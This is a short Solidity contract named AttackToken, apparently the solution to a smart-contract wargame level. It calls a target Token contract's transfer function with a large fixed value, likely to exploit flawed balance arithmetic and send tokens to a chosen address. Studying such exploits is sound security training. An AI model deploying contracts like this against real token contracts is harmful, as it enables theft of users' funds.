// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Token.sol";

contract AttackToken {

  uint public constant VALUE = 10000000;
  address public immutable to;
  Token public token;

  constructor(address _token, address _to) {
    token = Token(_token);
    to = _to;
  }

  function attackTransfer() public {
    token.transfer(to, VALUE);
  }
}